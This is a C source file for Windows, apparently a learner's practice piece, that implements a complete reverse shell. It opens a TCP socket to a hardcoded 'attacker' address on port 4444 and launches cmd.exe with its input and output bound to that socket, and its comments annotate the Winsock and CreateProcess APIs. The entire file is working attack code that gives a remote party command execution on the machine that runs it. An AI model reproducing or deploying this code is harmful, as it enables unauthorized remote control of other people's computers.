#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#pragma comment(lib, "ws2_32.lib")


int main(void){

WORD MyRequestedVersion;
WSADATA MyWsdata;
int err;


struct sockaddr_in connection_address;
char* attackerIp = "192.168.255.148";
short attackerPort = 4444;

connection_address.sin_family = AF_INET;
connection_address.sin_port = htons(attackerPort);
connection_address.sin_addr.s_addr = inet_addr(attackerIp);

SOCKET mySocket;
MyRequestedVersion = MAKEWORD(2,2);
// int WSAStartup(
//   [in]  WORD      wVersionRequired,
//   [out] LPWSADATA lpWSAData
// );

err = WSAStartup(MyRequestedVersion, &MyWsdata);
if(err != 0){
    printf("Failed WSAStartup  with error %d\n", err);
    return 1;
}

//Create a socket with WSASocketA 
//https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa//
// SOCKET WSAAPI WSASocketA(
//   [in] int                 af,
//   [in] int                 type,
//   [in] int                 protocol,
//   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,
//   [in] GROUP               g, //something about group. 0 is fine
//   [in] DWORD               dwFlags
// );
    mySocket =  WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL) ;
    if( mySocket == INVALID_SOCKET){
        printf("Failed to create socket\n");
        return -1;
    }
    printf("Socket created successfully\n");




    /*
    
    Connect socket to attacker machine
    */

//     int WSAAPI WSAConnect(
//   [in]  SOCKET         s,
//   [in]  const sockaddr *name,
//   [in]  int            namelen,
//   [in]  LPWSABUF       lpCallerData,
//   [out] LPWSABUF       lpCalleeData,
//   [in]  LPQOS          lpSQOS,
//   [in]  LPQOS          lpGQOS
// );


// struct sockaddr {
//         ushort  sa_family;
//         char    sa_data[14];
// };

// struct sockaddr_in {
//         short   sin_family;
//         u_short sin_port;
//         struct  in_addr sin_addr;
//         char    sin_zero[8];
// };


printf("Attempting Connection....\n");
int connResult = WSAConnect( mySocket, (sockaddr*) &connection_address, sizeof(connection_address), NULL, NULL, NULL, NULL);

    if(connResult != 0){
        printf("Error establishing connection\n");
        printf("connResult %i", connResult);
          printf("\t____ [!] Connecting failed due to: %d\n", WSAGetLastError());

        return -1;
    }else{
        printf("Made connection with the sever!!!\n I deserve a cookie");
    }


/*
STARTINFOA => Start command shell and bind sdout/err/input to it
typedef struct _STARTUPINFOA {
  DWORD  cb;//The size of the struct in bytes
  LPSTR  lpReserved;//null
  LPSTR  lpDesktop;
  LPSTR  lpTitle;//null
  DWORD  dwX;0
  DWORD  dwY;0
  DWORD  dwXSize;0
  DWORD  dwYSize;0
  DWORD  dwXCountChars;0
  DWORD  dwYCountChars;0
  DWORD  dwFillAttribute;0
  DWORD  dwFlags;?
  WORD   wShowWindow;0
  WORD   cbReserved2;0
  LPBYTE lpReserved2;NULL
  HANDLE hStdInput; Null
  HANDLE hStdOutput;null
  HANDLE hStdError;null
} STARTUPINFOA, *LPSTARTUPINFOA;
*/   


STARTUPINFOA myStarupInfoA;
HANDLE sHandle = (HANDLE)mySocket;

PROCESS_INFORMATION pi;
ZeroMemory(&myStarupInfoA, sizeof(myStarupInfoA));
myStarupInfoA.cb = sizeof(myStarupInfoA);
myStarupInfoA.dwFlags = STARTF_USESTDHANDLES;
ZeroMemory(&pi, sizeof(pi));
myStarupInfoA.hStdError = myStarupInfoA.hStdInput = myStarupInfoA.hStdOutput = sHandle;


/*
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
*/

if(!CreateProcessA(
    NULL,
    "cmd.exe",
    NULL,
    NULL,
    TRUE,
    NULL,
    NULL,
    NULL,
    &myStarupInfoA,
    &pi

)){
    printf("Process/shell creation failed; Saad Faaceee (%d)\n", GetLastError());
}else{
    printf("[*] Looks like we got a shell!\n");
    printf("Your pid is: %d", pi.dwProcessId);
}

//Wait until child process exits

WaitForSingleObject(pi.hProcess, INFINITE);
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);


    return true;
}